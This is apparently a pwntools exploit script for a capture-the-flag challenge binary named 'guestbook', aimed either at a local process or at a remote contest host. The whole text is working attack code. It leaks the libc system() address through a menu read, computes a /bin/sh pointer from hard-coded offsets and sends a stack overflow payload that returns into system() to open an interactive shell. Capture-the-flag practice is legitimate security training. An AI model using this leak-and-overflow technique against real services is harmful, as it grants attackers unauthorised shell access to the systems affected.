from pwn import *

local = True

if local:
	r = process("./guestbook")
else:
	r = remote("guestbook.tuctf.com", 4545)

for i in range(4):
	r.recvuntil(">>>")
	r.sendline("guest")

r.recvuntil(">>")
r.sendline("1")
r.recvuntil(">>>")
r.sendline("6") #leak system addr
s = r.recvuntil("\n--------")
system = u32(s[20:24])

log.info("system: %s" % hex(system))
r.recvuntil(">>")
r.sendline("2")

r.recvuntil(">>>")
r.sendline("6")

r.recvuntil(">>>")

if local:
	bin_sh = system + (0xf7f80f0c-0xf7e60e70)
else:
	bin_sh = system + (0x566b4551-0x565933e0)

r.sendline("AAAA"*12 + p32(system) + p32(bin_sh) + p32(bin_sh))

r.sendline("3")
r.sendline("3")
r.interactive()


